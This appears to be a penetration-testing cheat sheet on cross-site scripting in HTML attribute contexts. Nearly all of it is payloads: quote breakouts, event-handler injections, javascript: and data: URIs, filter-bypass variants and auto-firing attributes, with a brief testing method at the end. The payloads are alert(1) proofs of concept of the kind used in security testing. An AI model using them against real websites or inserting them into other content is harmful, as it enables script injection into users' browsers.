# XSS - Attribute Context

## Detecting Attribute Context
```html
<input value="INJECTION">
<div class="INJECTION">
<a href="INJECTION">
<img src="INJECTION">
```

## Breaking Out of Attribute (with quotes)
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

## Breaking Out Without Quotes (unquoted attribute)
```html
x onmouseover=alert(1)
x autofocus onfocus=alert(1)
```

## Event Handler Injection (same tag, no breakout needed)
```html
<input value="x" onclick="alert(1)">
<img src="x" onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
```

## Attribute-Specific Payloads

### href attribute
```html
<a href="javascript:alert(1)">click</a>
<a href="jav&#x09;ascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
```

### src attribute
```html
<img src="javascript:alert(1)">  <!-- Only works in old browsers/specific contexts -->
<iframe src="javascript:alert(1)"></iframe>
```

### style attribute
```html
<div style="background:url(javascript:alert(1))">  <!-- Legacy IE -->
<div style="width:expression(alert(1))">  <!-- Legacy IE -->
```

## Filter Bypass in Attribute Context

### Case Variation
```html
"ONMOUSEOVER="alert(1)
"OnMouseOver="alert(1)
```

### Encoding
```html
"%20onmouseover=%20alert(1)
"&#32;onmouseover=&#32;alert(1)
```

### No Space Needed (use / or other separators)
```html
"/onmouseover=alert(1)//
"/autofocus/onfocus=alert(1)//
```

## Auto-Executing Attributes (no user interaction)
```
autofocus + onfocus
onload (body, svg, img)
onerror (img)
onpageshow
onanimationstart + CSS animation
```

## Testing Methodology
```
1. Identify quote character used (', ", none)
2. Try breaking out: " then check rendered HTML
3. If breakout blocked, try event handler injection in same tag
4. If < > filtered, focus on attribute-only payloads
5. Test auto-triggering events (no click needed for automated scanners)
```
